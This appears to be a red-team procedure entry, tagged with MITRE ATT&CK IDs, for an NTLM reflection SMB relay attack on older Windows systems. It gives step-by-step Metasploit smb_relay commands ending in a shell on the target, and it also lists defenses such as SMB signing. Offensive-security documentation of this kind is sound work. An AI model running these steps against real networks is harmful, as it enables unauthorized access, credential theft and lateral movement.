---
id: 7e54e698-72b1-4682-8b3f-799caf3ba23e
name: ntlm-reflection-smb-relay-attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.338754+00:00'
updated_at: '2023-04-10T20:26:13.118953+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
sub_techniques:
  - >-
    [[sub-techniques/LLMNR/NBT-NS Poisoning and SMB Relay|T1557.001 -
    LLMNR/NBT-NS Poisoning and SMB Relay]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
  - '[[tags/NTLM Relay]]'
commands:
  - '[[commands/metasploit-use-smb-relay-exploit-module]]'
  - '[[commands/metasploit-show-smb-relay-targets]]'
  - '[[commands/metasploit-set-smb-relay-rhosts]]'
  - '[[commands/metasploit-set-smb-relay-lhost]]'
  - '[[commands/metasploit-run-smb-relay-exploit]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# NTLM Reflection SMB Relay Attack

## Summary

The NTLM Reflection SMB Relay attack is a man-in-the-middle technique that intercepts and relays NTLM authentication attempts over SMB to a target system, potentially allowing arbitrary code execution or unauthorized access. This procedure uses Metasploit to set up the relay, exploiting vulnerabilities in systems lacking SMB signing, such as those affected by MS08-068, to reflect authentication back or to another endpoint for privilege escalation.

## Description

This attack positions the attacker between a client and server to capture NTLM hashes during SMB connections and relay them to a target, often the originating machine (reflection) or another for lateral movement. It targets Windows systems from 2000 to Server 2008 where NTLM is enabled without signing enforced. The technique relies on poisoning name resolution (e.g., LLMNR/NBT-NS) to redirect traffic to the attacker's relay server. Success grants access to admin shares, execution of payloads, or credential theft. This is particularly effective in Active Directory environments for domain compromise.

## Requirements

1. Metasploit Framework installed and running on the attacker's machine.
2. Network access to intercept SMB traffic (e.g., same LAN or via ARP poisoning).
3. Target Windows systems (2000-XP/Server 2008) with NTLM enabled and SMB signing disabled.
4. Knowledge of target IP and basic domain credentials if needed for initial positioning.

## Defense

- Enable SMB signing on all Windows systems to prevent relay acceptance.
- Disable NTLM authentication and enforce Kerberos where possible.
- Implement network segmentation and monitor for anomalous SMB traffic (e.g., via IDS rules for port 445).
- Use Extended Protection for Authentication (EPA) on domain controllers.

## Objectives

1. Intercept and relay NTLM authentication to gain unauthorized system access.
2. Execute arbitrary code or access sensitive shares on the target.
3. Achieve persistence or lateral movement within the network.

## Instructions

### Step 1: Launch Metasploit and Load the SMB Relay Module

**Context**: Start the Metasploit console and load the exploit module for SMB relay to prepare the attack environment. This step initializes the relay capability.

**Command** ([[commands/metasploit-use-smb-relay-exploit-module]]):
```msfconsole
use exploit/windows/smb/smb_relay
```

> This command loads the module, changing the prompt to indicate the exploit is ready for configuration. If the module is not available, ensure Metasploit is updated.

### Step 2: View Available Targets

**Context**: Display the supported target operating systems for the relay exploit to select the appropriate one based on reconnaissance. This helps ensure compatibility with the victim's system.

**Command** ([[commands/metasploit-show-smb-relay-targets]]):
```msfconsole
show targets
```

> The output lists targets like Windows 2000, XP, and Server 2003/2008. Choose one matching the target (e.g., set target 0 for automatic detection).

### Step 3: Configure Relay Options

**Context**: Set the necessary parameters for the relay server, including the attacker's listening IP and the target IP. This positions the relay to capture and forward authentication.

**Command** ([[commands/metasploit-set-smb-relay-rhosts]]):
```msfconsole
set RHOSTS $_TARGET_IP
```

> Replace $_TARGET_IP with the victim's IP (e.g., 192.168.1.100). This specifies where to relay the authentication.

**Command** ([[commands/metasploit-set-smb-relay-lhost]]):
```msfconsole
set LHOST $_ATTACKER_IP
```

> Replace $_ATTACKER_IP with your machine's IP (e.g., 192.168.1.50). This is the address clients will connect to for the poisoned requests.

### Step 4: Execute the Relay Attack

**Context**: Run the exploit to start listening for NTLM authentication attempts and relay them to the target. Trigger the attack by forcing the victim to authenticate (e.g., via file share access).

**Command** ([[commands/metasploit-run-smb-relay-exploit]]):
```msfconsole
exploit
```

> This activates the relay server. Monitor for incoming connections; upon relay success, it may execute a payload or grant shell access.

## Expected Output

Successful execution results in a relayed session, potentially showing a Meterpreter shell or command prompt on the target. For example, after relay: "[*] Command shell session 1 opened". Failure indicators include "NTLM signing required" if defenses are enabled.

**Success Indicators**:
- Module loads without errors.
- Targets displayed match the environment.
- Relay captures auth and executes on target (e.g., new session established).
- Access to C$ share or SYSTEM shell obtained.
